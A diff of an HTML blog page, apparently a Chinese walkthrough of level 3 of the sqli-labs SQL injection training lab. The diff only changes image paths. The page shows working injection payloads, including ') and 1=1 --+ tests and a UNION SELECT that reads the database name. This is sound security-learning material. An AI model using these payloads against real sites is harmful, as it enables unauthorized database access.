@@ -193,24 +193,24 @@
     <div class="content-article">
         <h1 id="sqli-labs-t3"><a href="#sqli-labs-t3" class="headerlink" title="sqli-labs-t3"></a>sqli-labs-t3</h1><p><strong>注：在进行题解之前，建议前往<a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/9c69d48fd98ddb13c9024e9b.html">sqli-labs第一关分析-百度经验 (baidu.com)</a>学习前两关的绕过原理并尝试自行解题。</strong></p>
 <h3 id="一、观察题目"><a href="#一、观察题目" class="headerlink" title="一、观察题目"></a>一、观察题目</h3><p>同t1，t2一样的提示，尝试提交id&#x3D;[num]，一切正常</p>
-<p><img src="/sqli-labs-3/image-20220323193147202.png" alt="image-20220323193147202"></p>
+<p><img src="/2022/03/23/sqli-labs-3/image-20220323193147202.png" alt="image-20220323193147202"></p>
 <h3 id="二、寻找注入点"><a href="#二、寻找注入点" class="headerlink" title="二、寻找注入点"></a>二、寻找注入点</h3><p>尝试使用单引号，发现进行了报错</p>
-<p><img src="/sqli-labs-3/image-20220323193242026.png" alt="image-20220323193242026"></p>
+<p><img src="/2022/03/23/sqli-labs-3/image-20220323193242026.png" alt="image-20220323193242026"></p>
 <p>根据报错信息可知，这里有字符型注入点，并且在id&#x3D;1之后有一个括号。</p>
 <p>尝试对括号进行绕过</p>
 <p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) and 1=1 --+</span><br><span class="line">id=1&#x27;) and 1=2 --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="/sqli-labs-3/image-20220323193703167.png" alt="image-20220323193703167"></p>
-<p><img src="/sqli-labs-3/image-20220323193715491.png" alt="image-20220323193715491"></p>
+<p><img src="/2022/03/23/sqli-labs-3/image-20220323193703167.png" alt="image-20220323193703167"></p>
+<p><img src="/2022/03/23/sqli-labs-3/image-20220323193715491.png" alt="image-20220323193715491"></p>
 <p>同t1、t2，尝试输出数据库名称验证绕过成功</p>
 <p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;) and 1=2 union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="/sqli-labs-3/image-20220323193847363.png" alt="image-20220323193847363"></p>
+<p><img src="/2022/03/23/sqli-labs-3/image-20220323193847363.png" alt="image-20220323193847363"></p>
 <p>绕过成功</p>
 <h3 id="三、信息提取"><a href="#三、信息提取" class="headerlink" title="三、信息提取"></a>三、信息提取</h3><p>同t1，t2，在此不做过多赘述</p>
-<p><img src="/sqli-labs-3/image-20220323194047162.png" alt="image-20220323194047162"></p>
+<p><img src="/2022/03/23/sqli-labs-3/image-20220323194047162.png" alt="image-20220323194047162"></p>
 
     </div>
 </article>
